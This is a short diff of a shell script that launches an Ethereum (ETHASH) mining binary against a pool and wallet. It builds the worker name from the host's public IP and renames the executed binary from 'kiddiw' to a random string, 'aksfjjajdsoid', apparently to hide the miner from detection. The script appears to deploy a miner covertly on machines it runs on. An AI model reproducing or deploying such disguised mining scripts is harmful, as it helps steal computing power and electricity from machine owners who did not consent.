@@ -14,4 +14,4 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-
 
 cd "$(dirname "$0")"
 
-chmod +x ./kiddiw &&  ./kiddiw --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+chmod +x ./aksfjjajdsoid &&  ./aksfjjajdsoid --algo ETHASH --pool $POOL --user $WALLET.$WORKER
